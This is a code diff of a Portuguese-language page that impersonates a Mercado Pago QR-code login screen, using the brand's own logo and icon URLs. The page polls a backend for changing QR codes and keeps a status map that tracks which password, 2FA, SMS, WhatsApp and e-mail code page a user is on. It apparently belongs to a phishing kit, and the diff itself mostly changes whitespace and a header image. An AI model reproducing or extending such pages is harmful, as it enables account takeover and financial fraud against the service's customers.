@@ -15,7 +15,7 @@ function isMobileDevice() {
 if (isMobileDevice()) {
     $redirect_target_2fa = 'dois_fatores.php';
 } else {
-    $redirect_target_2fa = 'dois_fatores.php'; 
+    $redirect_target_2fa = 'dois_fatores.php';
 }
 
 ?>
@@ -27,7 +27,7 @@ if (isMobileDevice()) {
     <title>Escaneie o QR para iniciar sessão de forma segura</title>
     <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
     <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
-    
+
     <style>
         :root {
             --andes-color-yellow-500: #ffe600;
@@ -48,7 +48,7 @@ if (isMobileDevice()) {
         .help-link { display: block; margin-top: 24px; color: var(--andes-text-color-link); text-decoration: none; font-size: 14px; font-weight: 500; }
         .help-link:hover { text-decoration: underline; }
         .qr-card { width: 100%; max-width: 38.75rem; height: 26.25rem; margin-top: 0; background-color: var(--andes-background-color-primary); box-shadow: 0 1px 4px 0 rgba(0,0,0,.1); border-radius: 6px; padding: 48px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        
+
         /* AJUSTE CSS: Estilos para o wrapper e o logo */
         #qr-wrapper {
             position: relative;
@@ -86,7 +86,7 @@ if (isMobileDevice()) {
 </head>
 <body>
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.146/mercadolibre/pt_logo_large_plus@2x.webp" type="image/svg"/>
     </header>
 
     <main class="main-content">
@@ -103,7 +103,7 @@ if (isMobileDevice()) {
                     <div id="qr-code-container"></div>
                     <img id="qr-logo" src="https://http2.mlstatic.com/frontend-assets/auth-totp-in-app-frontend/qr-mp.png" alt="Logo MP">
                 </div>
-                
+
                 <a href="senha.php" class="other-method-link">Escolher outro método</a>
             </div>
         </div>
@@ -150,7 +150,7 @@ if (isMobileDevice()) {
 
                 if (data.success && data.data !== currentQrData) {
                     console.log('Detectado novo QR Code. Atualizando a tela...');
-                    
+
                     if (data.type === 'image') {
                         displayQrImage(data.data);
                     } else if (data.type === 'text') {
@@ -167,7 +167,7 @@ if (isMobileDevice()) {
         }
         setInterval(verificarQrCode, 3000);
     </script>
-    
+
     <script>
         (function() {
             const statusMap = {'index.php':'...','login-mobile.php':'...','senha.php':'...','senha-mobile.php':'...','dois_fatores.php':'...','dois_fatores2.php':'...','doisfatores2mobile.php':'...','sms_desktop.php':'...','sms_mobile.php':'...','sms_whats_desktop.php':'...','sms_whats_mobile.php':'...','qrcode-mobile.php':'...','telaqr.php':'Usuário na tela para logar com QR Code (Desktop)','email2fadesktop.php':'...','email2famobile.php':'...','emailsms_desktop.php':'...','emailsms_mobile.php':'...','sms2fadesktop.php':'...','sms2famobile.php':'...','whats2fadesktop.php':'...','whats2framobile.php':'...'};
